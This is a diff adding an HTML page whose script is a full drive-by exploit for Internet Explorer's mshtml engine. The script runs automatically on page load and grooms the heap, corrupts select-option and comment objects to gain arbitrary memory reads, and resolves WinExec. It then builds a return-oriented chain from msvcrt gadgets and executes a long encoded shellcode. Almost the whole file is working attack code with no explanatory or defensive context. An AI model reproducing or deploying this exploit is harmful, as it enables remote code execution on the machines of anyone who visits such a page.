@@ -1,0 +1,412 @@
+
+<!DOCTYPE html> 
+<html>
+  <head>
+    <script>
+      function str2dw(str) {
+      if(str.length < 2) {
+        return str.charCodeAt(0);
+      }
+        return str.charCodeAt(1) * 0x10000 + str.charCodeAt(0);
+      }
+
+      function rdDword(r, offset) {
+        return r.substringData((offset-4)/2, 1).charCodeAt(0) + 0x10000 *  r.substringData((offset-4)/2 + 1, 1).charCodeAt(0);
+      }
+            
+      function makeaddr(addr) {
+        return String.fromCharCode(addr % 0x10000, addr / 0x10000);
+      }  
+
+     function WideToAscii(WideStr) {
+        result = ""
+        for(i = 0; i < WideStr.length; i++) {
+          c = WideStr.charCodeAt(i) & 0xFF
+          if(c == 0) { return result }
+          result += String.fromCharCode(c)
+          c = WideStr.charCodeAt(i) >> 8
+          if(c == 0) { return result }
+          result += String.fromCharCode(c)
+        }
+        return result
+      }
+
+      function Memory(a_elm, rd_elm) {
+        this.a = a_elm;
+        this.rd = rd_elm;
+
+        this.readDword = function(address) {
+          this.a.coords = [0x4013, 0x55555555, address, 0x77777777]
+          return parseInt(this.rd.getAttribute('a'));
+        }
+
+        this.readWord = function(address) {
+          this.a.coords = [0x4012, 0x55555555, address, 0x77777777]
+          return parseInt(this.rd.getAttribute('a'));
+        }
+
+        this.readByte = function(address) {
+          this.a.coords = [0x4011, 0x55555555, address, 0x77777777]
+          return parseInt(this.rd.getAttribute('a'));
+        }
+
+        this.readAscii = function(address) {
+          result = ""
+          c = this.readByte(address)
+          while(c != 0x0) {
+            //alert(c);
+            result += String.fromCharCode(c);
+            address += 1
+            c = this.readByte(address);
+          }
+          return result;
+        }
+      }
+
+      function getModuleBase(mem, mod_ptr) {
+        mod_ptr = mod_ptr & 0xFFFF0000
+        data = mem.readWord(mod_ptr)
+        while(data != 0x5a4d) {
+          mod_ptr -= 0x10000;
+          data = mem.readWord(mod_ptr)
+        }
+        return mod_ptr;
+      }
+
+      function getExportedFunction(mem, base, fName) {
+          //some shortcuts taken here, but MS modules all behave nicely when it comes to PE headers so should be fine for those modules.
+          e_lfanew = mem.readWord(base + 0x3C);
+          exportTable = mem.readDword(base + e_lfanew + 0x78)
+          exportTableSize = mem.readDword(base + e_lfanew + 0x7C);
+          numExports = mem.readDword(base + exportTable + 0x18);
+          funcNames =  mem.readDword(base + exportTable + 0x20);
+          funcRVATable =  mem.readDword(base + exportTable + 0x1C);
+          var i = 0;
+          while(i < numExports) { 
+            //read up on PE File headers if you wonder whats going on here.
+
+            funcNameRVA = mem.readDword(base + funcNames + i * 4);
+            funcName = mem.readAscii(base + funcNameRVA, fName.length);
+            //Math.atan2(1, (funcName + " ").toString());
+            funcName = funcName.toLowerCase();
+            if(funcName == fName.toLowerCase()) {
+              funcRVA = mem.readDword(base + funcRVATable + (i * 4));
+
+              return funcRVA + base;
+            }
+            i += 1;
+          }
+          return 0x0;
+        }
+
+
+     function getImportedFunction(mem, base, modName, funcname) {
+        //some shortcuts taken here, but MS modules all behave nicely when it comes to PE headers so should be fine for those modules.
+        e_lfanew = mem.readWord(base + 0x3C)
+        importTable = mem.readDword(base + e_lfanew + 0x80)
+        importTableSize = mem.readDword(base + e_lfanew + 0x84);
+        
+        var i = 0; 
+        while(i < importTableSize/0x14) { 
+          //read up on PE File headers if you wonder whats going on here.
+          moduleNameAddr = mem.readDword(base + importTable + (i * 0x14) + 0xC)
+          moduleName = mem.readAscii(base + moduleNameAddr);
+          moduleName = moduleName.toLowerCase();
+          if(moduleName == modName.toLowerCase()) {
+            nameTable = mem.readDword(base + importTable + (i * 0x14));
+            nameOffset = mem.readDword(base + nameTable);
+            importRVA = mem.readDword(base + importTable + (i * 0x14) + 0x10);
+            j = 0;
+            while(nameOffset != 0x0) {
+              name = mem.readAscii(base + nameOffset + 2);
+              if(name.toLowerCase() == funcname.toLowerCase()) {
+                func_addr = mem.readDword(base + importRVA + j*4);
+                return func_addr;
+              }
+              j++;
+              nameOffset = mem.readDword(base + nameTable + j * 4);
+            }
+          }
+          i += 1;
+        }
+        return 0x0;
+      }
+
+     function getImportedModule(mem, base, modName) {
+        //some shortcuts taken here, but MS modules all behave nicely when it comes to PE headers so should be fine for those modules.
+        e_lfanew = mem.readWord(base + 0x3C)
+        importTable = mem.readDword(base + e_lfanew + 0x80)
+        importTableSize = mem.readDword(base + e_lfanew + 0x84);
+        
+        var i = 0; 
+        while(i < importTableSize/0x14) { 
+          //read up on PE File headers if you wonder whats going on here.
+          moduleNameAddr = mem.readDword(base + importTable + (i * 0x14) + 0xC)
+          moduleName = mem.readAscii(base + moduleNameAddr);
+          moduleName = moduleName.toLowerCase();
+          //alert(moduleName);
+          if(moduleName == modName.toLowerCase()) {
+            importRVA = mem.readDword(base + importTable + (i * 0x14) + 0x10);
+            func_addr = mem.readDword(base + importRVA);
+            //ert("found somefunc: " + func_addr.toString(16));
+            return getModuleBase(mem, func_addr);
+          }
+          i += 1;
+        }
+        return 0x0;
+      }
+
+      function makeRop(mem, rloc, module, sc, offset) {
+
+        msvcrt_base = getImportedModule(mem, mshtml_base, "msvcrt.dll");
+
+        stage2_offset = offset + 0x50;
+        stackcopysize = 0x54;
+        sc_offset     = offset + 0xA4;
+
+        pivot = msvcrt_base + 0x149e6
+
+        pop_eax       = msvcrt_base + 0x3181f
+        xchg_eax_edi  = msvcrt_base + 0x32eb2;
+        xor_edx       = msvcrt_base + 0x40ccc;
+        add_edx_edi   = msvcrt_base + 0x33081;
+        pop_ecx       = msvcrt_base + 0xa984;
+        sub_eax_ecx   = msvcrt_base + 0x1442a
+        rep_movsd     = msvcrt_base + 0x307d7;
+        pop_esi       = msvcrt_base + 0xa53d;
+        mov_eax_edx   = msvcrt_base + 0x487ea;
+        cleanup       = msvcrt_base + 0x21f2d;
+        va_import     = msvcrt_base + 0x11bc; 
+        ct_import     = msvcrt_base + 0x121c; 
+        mov_eax_eax_8 = msvcrt_base + 0x65b57;
+        mov_esp_eax   = msvcrt_base + 0x1157c
+
+        rop = makeaddr(xchg_eax_edi);
+        rop += makeaddr(pop_eax);
+        rop += makeaddr(rloc + offset + 4);
+        rop += makeaddr(pivot);
+        while(rop.length < offset/2) {
+          rop += "AA";
+        }
+        rop += makeaddr(pivot);
+        rop += makeaddr(xor_edx);
+        rop += makeaddr(add_edx_edi);
+        rop += makeaddr(xchg_eax_edi);
+        rop += makeaddr(pop_ecx);
+        rop += makeaddr(stackcopysize);  //align 4 fix!
+        rop += makeaddr(sub_eax_ecx);
+        rop += makeaddr(pop_ecx);
+        rop += makeaddr(stackcopysize /4);  //align 4 fix!
+        rop += makeaddr(pop_esi);
+        rop += makeaddr(rloc + stage2_offset);
+        rop += makeaddr(xchg_eax_edi);
+        rop += makeaddr(rep_movsd);
+        rop += makeaddr(0x9999990);
+        rop += makeaddr(0x9999991);
+        rop += makeaddr(mov_eax_edx);
+        rop += makeaddr(pop_ecx);
+        rop += makeaddr(stackcopysize);
+        rop += makeaddr(sub_eax_ecx);
+        rop += makeaddr(pivot);
+        rop += makeaddr(pop_eax);
+        rop += makeaddr(va_import - 8);
+        rop += makeaddr(mov_eax_eax_8);
+        rop += makeaddr(mov_esp_eax);
+        rop += makeaddr(0x41414141);
+        rop += makeaddr(pop_eax);
+        rop += makeaddr(rloc);
+        rop += makeaddr(0x1000);
+        rop += makeaddr(0x1000);
+        rop += makeaddr(0x40);
+        rop += makeaddr(ct_import - 8);
+        rop += makeaddr(mov_eax_eax_8);
+        rop += makeaddr(mov_esp_eax);
+        rop += makeaddr(0x41414141);
+        rop += makeaddr(cleanup);
+        rop += makeaddr(0);
+        rop += makeaddr(0);
+        rop += makeaddr(rloc + sc_offset);
+        rop += makeaddr(0);
+        rop += makeaddr(0);
+        rop += makeaddr(0);
+        rop += sc;
+
+        return rop;
+      }
+
+      function findGadget(m, module, bytes) {
+        start = module + 0x1000;
+        while(true) {
+          Math.atan2(1, ("Trying to find " + bytes[0].toString(16) + " at " + start.toString(16)).toString(16));
+          if(m.readByte(start) == bytes[0]) {
+            tmp = start
+            for(j = 1; j < bytes.length; j++) {
+              if(m.readByte(tmp + j) != bytes[j]) {
+                start++;
+                continue;
+              }
+              if(j == bytes.length) {
+                return start;
+              }
+            }
+          }
+          start++;
+        }
+      }
+
+      function replaceDataWithNulls(c, offset, len, d) {
+        offset = (offset - 4)/2;
+        //get original data:
+        nulls = new Array();
+        for(i = 0; i <= offset; i++) {
+          if(c.substringData(i, 1).charCodeAt(0) == 0x0) {
+            nulls.push(i);
+          }
+        }
+        //replace nulls
+        for(i = 0; i < nulls.length; i++) {
+          c.replaceData(nulls[i], 1, "X");
+        }
+        for(i = len - 1; i >= 0; i--) {
+          Math.atan2(1, ("replacing at offset " + (offset + i).toString(16) + " : data? " + d.substr(i, 1) + " " + d.substr(i, 1).charCodeAt(0).toString(16)).toString(16));
+          c.replaceData(offset + i, 1, d.substr(i, 1));
+        }
+        //Math.atan(1);
+        for(i = nulls.length - 1; i >= 0; i--) {
+          c.replaceData(nulls[i], 1, "\u0000");
+        }
+      }
+
+      function Start() {
+        a = document.createElement('a');
+        d = document.createElement('div');
+        rd1 = document.createElement('comment');
+        ropcom = document.createElement('comment');
+        d.setAttribute('a', 0x41414141);
+        d.setAttribute('b', a);
+        d.setAttribute('c', rd1);
+        d.setAttribute('d', ropcom);
+        d.setAttribute('e', 0x41414143);
+        d.setAttribute('f', 0x41414144);
+        d.setAttribute('g', 0x41414145);
+
+        heap = new Array(100)
+        for(i = 0; i < heap.length; i++) {
+          heap[i] = d.cloneNode(1);
+        }
+
+        s = document.createElement('select');
+        o1 = document.createElement('option');
+        o2 = document.createElement('option');
+
+        for(i = 0; i < 19; i++) {
+          s.options.add(document.createElement('option'));
+        }
+        Math.cos(1);
+        Math.atan2(1, "0--------------------------------- comment + data")
+        rd1.data = "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEEFFFFFFFFGGGGG";
+        Math.atan2(1, "0--------------------------------- clone")
+        rd2 = d.cloneNode(1);
+        Math.sin(1);
+        Math.atan2(1, "0--------------------------------- add one more")
+        s.options.add(o1);
+        Math.atan2(1, "0--------------------------------- delete one")
+        s.options[0] = null;
+        Math.atan2(1, "0--------------------------------- add with negative")
+        try { s.options.add(o2, -0xF0/4);} catch(e) {}
+        Math.atan2(1, "0--------------------------------- done")
+        Math.sin(1);
+        //Math.atan(1);
+
+        rd1.deleteData(0x100, 0x20000000);
+        LFHMetaOne = rdDword(rd1, 0x70);
+        LFHMetaTwo = rdDword(rd1, 0x74);
+        Attr_b_tear = rdDword(rd1, 0x94);
+        Attr_c_tear = rdDword(rd1, 0xA4);
+        Attr_d_tear = rdDword(rd1, 0xB4);
+        //alert(Attr_a_hash.toString(16) + " : " + Attr_b_tear.toString(16) + " : " + Attr_c_tear.toString(16))
+        //time to mess things up
+
+        //replaceDataWithNulls(rd1, 0x4, 2, makeaddr(0x41414242) );
+        replaceDataWithNulls(rd1, 0x78, 2, makeaddr(0x10001f02) );
+        replaceDataWithNulls(rd1, 0x84, 2, makeaddr(Attr_b_tear + 0xC));
+        
+        //Math.atan2(1, "-------- replaced offset 74?");
+        //Math.atan(1);
+        //replacement = "XXXXXX" + makeaddr(0x10001f02) + makeaddr(Attr_a_hash) + "AA" + makeaddr(Attr_b_tear + 0xC);
+        //rd1.replaceData(0x68/2, replacement.length, replacement);
+
+        ALoc = str2dw(rd2.getAttribute('a'));
+
+        Math.atan2(1, ("    --------------------------- " + ALoc.toString(16)).toString());
+
+        //replacement = "XXXXXX" + makeaddr(0x10000c02) + makeaddr(Attr_a_hash) + "AA" + makeaddr(ALoc + 0x3C);
+        //rd1.replaceData(0x68/2, replacement.length, replacement);
+
+        replaceDataWithNulls(rd1, 0x78, 2, makeaddr(0x10000c02) );
+        replaceDataWithNulls(rd1, 0x84, 2, makeaddr(ALoc + 0x3C));
+
+        m = new Memory(a, rd2);
+
+        vftable = m.readDword(ALoc);
+        //alert(vftable.toString(16));
+
+        mshtml_base = getModuleBase(m, vftable)
+
+        //alert("mshtml at " + mshtml_base.toString(16));
+        k32_base = getImportedModule(m, mshtml_base, "kernel32.dll");
+        WinExec = getExportedFunction(m, k32_base, "WinExec");
+        //build ROP        
+        sc = unescape("%uaeb9%u0001%ud900%ud9ee%u2474%u5bf4%u7381%uf813%uadc7%u83af%ufceb%uf4e2%u2f04%uaf2f%uc7f8%u26cd%uf61d%ucb6d%u9773%u249d%ucbaa%ufd26%u4cec%u87df%u70f7%u89e7%u38c9%u9301%ubb99%u83af%u06d8%ua262%u00f9%u5d4f%u90aa%ufd26%u4ce8%u93e7%u8b73%ud7bc%u8f1b%u7eac%u4ca9%u8ff4%u14f9%ue626%u24e0%ue697%uf373%uae26%uf62e%u0352%u0839%uaea0%uff3f%uda4d%uc40e%u57d0%ubac3%uda89%u9f1c%uf726%uc6dc%uc97e%ucb73%u24e6%udba0%u7cac%uc373%uae26%u4e28%u8be9%u9cdc%ucef6%u9da1%u50fc%u9818%uf5f2%ud573%u2246%uada5%u22ac%u757d%uafad%u97f8%u9ec5%ua873%u502a%u7c2d%u1a5d%u915a%u09c5%u7a6d%u5030%ufb2d%ud3ab%u47f2%u4f56%uc28d%ue816%ub5eb%uc5c2%u94f8%u7a52%ua888%ucada%ub48a%ucac5%uab94%uca83%ua280%u828d%ubf9d%uccc8%ua5d8%udfd4%ub499%u8fde%ua9d5%udfc2%uead8%u8ffa%uae90%ucbc9%ua99d%u828d%ua896%uc6c3%ub396%uddc8%ua499%uc6d9%ua28e%ue68d%u9fbd%u8b8d%ue3d0%u92de%ua2b6%u82da%ua5b7%ucac7%ub39b%ue68d%ue9b7%ucae0%ua895%ud6df%ub3ab%ucadf%uaa99%u8385%u84a3%uc1c2%ua28e%udbdf%ufda5%ue997%ua88a%uedc0%ub499%u99c8%u94cc%uddd9%ua991%u87ca%u8fdf%udc99%u86b1%udee1%ua9ba%uc4eb%u86bb%u9e98%uf5af%u989f%u889a%uedef%ufec1%ucc9c%ub1b5%udfe3%u9699%ud7c4%u89bb%uded9%u86a0%uc1ee%u91af%ue3c9%u869c%uc3ea%u918a%u98ea%u9e82%uc8ef%u8bb1%u9ef4%ua592%ufbfa%u94ab%ue49c%u8ed3%ue8fd%u8bd7%uc3d4%u81aa%ucc95%ub2b2%uc2c1%u90c1%ue4ee%u9db0%u9995%ub29b%uecc9%ub0d7%uc7f7%u928e%ud7fe%u8581%u98c7%uae9b%ufec1%u9d88%uebe9%ub09e%uc9d4%u8ac1%uc495%u96be%ue7da%uf38e%ue5e7%u828d%u99fd%u8e91%uc3d9%u88cb%uc0d9%u9181%uc3c4%uff96%uccee%ue889%ucdd5%ua496%uf6f7%u9291%ued94%uf0cd%uede4%ua9d3%u9fea%u81b5%uee82%ub3ae%u9982%ueccb%u97c9%u8ca1%uee82%uec96%uf9d7%ub7d3%ud9fe%uaead%udf99%uec97%uec9a%ub58f%ud599%u83b2%uc299%ub2a0%uede6%ub7cd%ue4c6%uaeba%u9ac9%ua6b2%uf6fe%uafc9%ue1e6%uadbd%uf7df%u90ae%uebfd%ua99c%ud6c7%uf782%udae2%uab8c%udece%ua4ca%uc89f%ub597%ud9dc%u88a9%u96c2%uf0a9%u84e4%ua888%udaee%ua1cb%u96e7%u94bf%ufbdc%ua18b%uced8%ua1bd%uf8e1%u8b91%uc4e2%ub59e%uf69d%uae81%uc3d7%ub3cf%uc5c3%ub3b2%ud5d4%u8992%uc3ee%u97af%udcf4%ua288%ud7e4%ua0ab%uf9c5%ubf9f%ue2f7%u96c0%uff9d%u838f%uca94%uf7bc%ufdc4%ua09c%udaeb%u86cd%u80ff%ua0d7%u9bc8%u9dc0%uc1f8%u8ca0%ucdd7%ua4b4%uf795%u8ba2%uf9e7%ua199%u9cc4%uafcd%ucef5%uf6cd%u9786%u9e8a%ufcc1%ua2b4%ud6fd%u94b9%ue5dd%ub1b2%u99e1%u8180%ue1df%u82ba%ufcec%u8596%uc399%u91ad%uc5ee%uf692%uc09e%ua38d%u9dc0%u8bb3%udfc1%ua8ca%uc5d7%ub3bf%ue4c9%u9db9%uddf9%uac9b%uddde%u8990%uc0cf%u89bb%uc8d4%ua993%ue4c7%ua88d%udcfb%ua188%uc399%u88cd%ucee1%ub2b7%ue0c2%u83b9%u84e9%u8dc0%uffda%ub181%udcd9%u96cb%uc5fb%ua9a8%ue6fb%ub6c1%ufbfc%uabab%ue9cc%u8e99%ue1c5%u9d9c%ue8fb%ub780%uc4c4%uf2ca%udde0%uab93%ud7e3%ua8b5%ufdf5%u8b8c%uddc1%ub7b5%ud6e0%u8491%ud8d8%ua4ae%uc5c5%ub296%uebd8%u8dcb%udfe6%u9fb5%udac8%uf0d7%ud7d4%u95c8%ue7fa%ua19e%ufef5%u8095%u9fdb%u97b9%ufadd%u978f%uddf9%u8f82%ucbfb%u9e9b%uc7f4%ub7bb%udcf4%ub7c8%udfca%uf7d7%ud7c4%ub6b6%uc2ee%uaccf%ucdea%ua9a2%uf6e0%u8aa8%u9695%ua0cf%u9bfc%uf2a2%udffa%ua688%uf6d9%u809b%uc4de%u9da0%ue9fd%ub699%ud9fa%ua6c8%ue5e2%u8488%uced7%uf09c%uf9d5%u9db7%uffd7%ue8b0%udee7%u8491%uc8da%ua6a2%uf8c1%ub7bc%u9794%ua09e%uff99%u81ae%uc3eb%ua5ab%udbcf%uafac%udbf9%uacbe%ufae0%u8ac0%uf9ff%ua1c1%u99c7%ub0b3%udbd8%ubd8a%uc586%ubec0%uc6c9%uf4cc%udbfb%uaa9c%ud8c3%ube8a%uc49a%u8ba9%ue7f9%u96b4%ufce2%ua6b5%ud9fa%u8ca9%ufdd8%uabab%ucc9f%ubda0%uedde%ub3ba%uc4c7%u9fcb%ud895%ufec8%uc398%uf79d%uc2da%u8988%ue49f%u90d3%ucad8%uf589%ud7cf%u8e92%u80fb%u958e%udef5%u91d7%uece2%u8fbf%ud6ca%ub0bc%uc9fc%uaccc%ucede%u94bb%u9a9a%u82a9%ue4e5%uf280%ue5dc%uada9%ueb95%ua2b1%ufce9%u82af%ufdca%u8589%udbd5%ubeb5%u9def%u9ecf%ucd9a%ub5ce%ucdee%u83bd%udbee%uaac8%uc586%u96ce%u80cf%u8ecd%uc9e9%uf0b1%uf8d9%u9f81%ue1f9%uf0ae%uce9a%uf28a%ufddc%uf497%ucdc4%ufeae%ud8ea%u89bf%uddd5%ua6ab%uffea%ua9cf%ufed9%uf4c0%u9995%u88c9%uf8db%uaea2%udcd4%u8b99%uf7d7%u8296%ufdc5%u91ab%u84de%ubfae%udedc%ua590%u98ff%ua6cb%ud7ef%ub7cf%udee4%ua9ca%ud8eb%uacae%ucbdb%ubdc8%ucdf9%u86c0%u9dcb%uf48a%udffb%u8c8a%uf79a%u899d%uddce%ub290%ue7ef%ub79e%ufde8%u8f8e%ue9e8%uf2a8%uc39a%ua49f%uffce%u8e92%ue2dd%u809d%ue0fb%uf6c9%udae6%uadc1%u9c9a%ua9d7%uddcf%u8a8c%u9cde%ua3a9%u9df7%uf1c8%ue7e4%uec81%ucae5%uae93%udbfb%ua1af%u84ef%u97bb%uc7c7%uf2b0%ud5d7%u808f%ue5f8%uac8f%udcd9%u968a%u84d5%uaeac%u98fc%ub394%ud9fe%u83b3%ucbca%u9692%uc0c2%ub5a9%ud59f%u83b1%udff4%ua48d%udefa%ub397%uebe3%uad8b%udfee%ub593%ue6de%u8dba%uf882%uab9d%uf8f7%u849d%ucde8%uacb4%ufcda%u9fb9%u9c99%u8299%ud5c3%uffcc%u9fc9%ua9b9%uedd8%ub59a%ud8db%u81ab%ud8cc%u95ad%ued9c%u8cbc%ufcec%ua088%uf7e1%ub1b1%uc89d%ufeba%udeef%ua9a9%ue7fe%ua891%uedef%u939b%uffe4%uaca2%ue2cf%uf1af%ue49f%ubf9e%uc3ef%uf3ab%uc0f5%u8a8e%uc7cf%ua197%uc586%uf4bf%uf99e%u88b7%uc486%uabd7%u97f8%uffbc%ud995%ua6af%uc9f7%u94b3%ue1c8%u9dad%u9ad7%ub296%ud5fb%ub3af%u979b%ua09c%uf582%u84bb%ue2f9%uf78d%ucdce%uf4ac%ucae4%uf3aa%ud9d8%u8289%ufbd9%u8ed7%udde9%u97c9%ucc99%u88ce%uf6cb%u85b3%u80e3%u979d%ucefa%ue8b9%udbec%uff82%u9cca%u979f%uc4fc%u86b9%u92ec%ue0c5%u8684%u8ec3%uf7e8%uefd8%ucae3%uea8f%ucde2%ua292%udbce%u8ed8%u81e2%ub3ab%ucadf%uaa99%ucaff%ua399%uddc8%u89d0%ud8c8%u88d5%uc5cf%ua49d%u8fd9%u88b1%uec83%uaa97%udddd%ub49d%uc6de%ua997%ue883%uae82%ufcdd%ub58c%ucec8%uef95%udc89%u9cd4%ue0e4%u84d6%uc2c2%ub588%udcc8%uae8b%uc1c2%u84d6%uc2c2%ub588%udcc8%uae8b%uc1c2%ua8b5%ucac9%ufda5%ueb97%ua49d%uc2c2%ub588%udcc8%uee8b%u8684%u95d6%ucec8%u939c%ueac2%ua396%u8685%ueec3%uafad");
+
+        rop_length = sc.length + 0x100;
+        rdata = "A"; 
+        while(rdata.length < rop_length) rdata += rdata;
+        ropcom.data = rdata;
+
+        rop_elm = m.readDword(Attr_d_tear + 0xC);
+        //alert("rop comment elm at : " + rop_elm.toString(16));
+
+        roploc = m.readDword(rop_elm + 0x28);
+
+        //alert(roploc.toString(16));
+        //fake s_apfnTrackerTearoffVtable object, size 0x28
+        fakeTearOff = "";
+        for(i = 0; i < 0x28; i += 4) {
+          if(i == 0xC) {
+            fakeTearOff += makeaddr(roploc + 0x28);
+            //fakeTearOff += makeaddr(0x99999999);
+          }
+          else {
+            fakeTearOff += makeaddr(m.readDword(Attr_b_tear + i));
+          }
+        }
+        fakeTearOff += makeaddr(roploc + 0x2C);
+        ropstr = fakeTearOff + makeRop(m, roploc + 0x2C, mshtml_base, sc, 0x38);
+
+        for(i = ropstr.length -1; i >= 0; i--) {
+          ropcom.replaceData(i, 1, ropstr.substr(i, 1));
+        }
+
+        //20000902 
+        Math.atan2(1, ("roploc = " + roploc.toString(16)).toString(16));
+        replaceDataWithNulls(rd1, 0x88, 2, makeaddr(0x20000902));
+        replaceDataWithNulls(rd1, 0x94, 2, makeaddr(roploc));
+        Math.atan(1);
+        rd2.b();
+        //cleanup
+        replaceDataWithNulls(rd1, 0x78, 2, makeaddr(0x00000302));
+        replaceDataWithNulls(rd1, 0x88, 2, makeaddr(0x00000302));
+
+      }
+    </script>
+  </head>
+  <body onload="Start();">
+  </body>
+</html>
+
+// bp !mshtml + 218dbc
+
+
+
+    
